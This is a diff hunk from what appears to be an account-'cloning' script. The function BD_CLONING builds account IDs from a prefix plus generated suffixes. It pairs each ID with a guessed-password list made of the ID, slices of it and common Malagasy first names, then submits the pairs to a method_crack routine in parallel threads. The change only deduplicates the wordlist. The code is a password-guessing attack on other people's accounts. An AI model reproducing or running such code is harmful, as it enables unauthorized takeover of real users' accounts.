@@ -116,7 +116,7 @@ def BD_CLONING():
         linex()
         for psx in user:
             ids=code+psx
-            passlist=[psx,ids,ids[:7],ids[:6],ids[5:],ids[4:],'nomena','Nomena','lafatra','lafatra','fahendrena','Fahendrena','fandresena','Fandresena','nantenaina','Nantenaina','rakoto','nilaina','Nilaina','nirina','Nirina','narindra','Narindra','Rakoto','fitahiana','Fitahiana','diamondra','Diamondra','faniry','Faniry','rakoto','hasina','Hasina','tsilavina','Tsilavina','finaritra','Finaritra','fanomezana','Fanomezana','Sarindra','sarindra','nambinina','Nambinina','Sitraka','sitraka','mamitiana','Mamitiana','vololona','Vololona','mamisoa','Mamisoa','fanomezantsoa','Fanomezantsoa','fanantenana','Fanantenana','narindra','Narindra','Lalatiana','lalatiana','sarobidy','Sarobidy','lalaina','Lalaina', 'mendrika', 'Mendrika' 'mahery','Mahery','jessica','Jessica','mandresy','Mandresy']
+            passlist=[psx,ids,ids[:7],ids[:6],ids[5:],ids[4:],'nomena','Nomena','lafatra','fahendrena','Fahendrena','fandresena','Fandresena','nantenaina','Nantenaina','nilaina','Nilaina','nirina','Nirina','Narindra','Rakoto','fitahiana','Fitahiana','diamondra','Diamondra','faniry','Faniry','rakoto','hasina','Hasina','tsilavina','Tsilavina','finaritra','Finaritra','fanomezana','Fanomezana','Sarindra','sarindra','nambinina','Nambinina','Sitraka','sitraka','mamitiana','Mamitiana','vololona','Vololona','mamisoa','Mamisoa','fanomezantsoa','Fanomezantsoa','fanantenana','Fanantenana','narindra','Narindra','Lalatiana','lalatiana','sarobidy','Sarobidy','lalaina','Lalaina', 'mendrika','mahery','Mahery','jessica','mandresy','Mandresy']
             Dipto.submit(method_crack,ids,passlist)
             
     linex()
